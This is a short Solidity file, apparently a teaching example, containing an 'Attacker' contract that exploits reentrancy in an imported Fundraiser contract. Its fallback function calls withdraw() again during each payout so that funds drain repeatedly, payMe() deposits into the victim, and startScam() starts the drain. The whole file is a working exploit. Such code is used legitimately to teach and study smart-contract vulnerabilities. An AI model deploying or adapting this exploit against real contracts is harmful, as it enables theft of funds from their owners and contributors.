pragma solidity ^0.4.8;

import "./fundraiser.sol";

//Insecure code
contract Attacker {
  address public fundraiserAddress;
  uint public drainTimes = 0;

  function Attacker (address victimAddress) {
    fundraiserAddress = victimAddress;
  }

  //fallback function
  function() payable {
    if (drainTimes<3) {
      drainTimes++;
      Fundraiser(fundraiserAddress).withdraw();
    }
  }

  function getFunds() returns (uint) {
    return address(this).balance;
  }

  function payMe() payable {
    Fundraiser(fundraiserAddress).contribute.value(msg.value)();
  }

  function startScam() {
    Fundraiser(fundraiserAddress).withdraw();
  }
}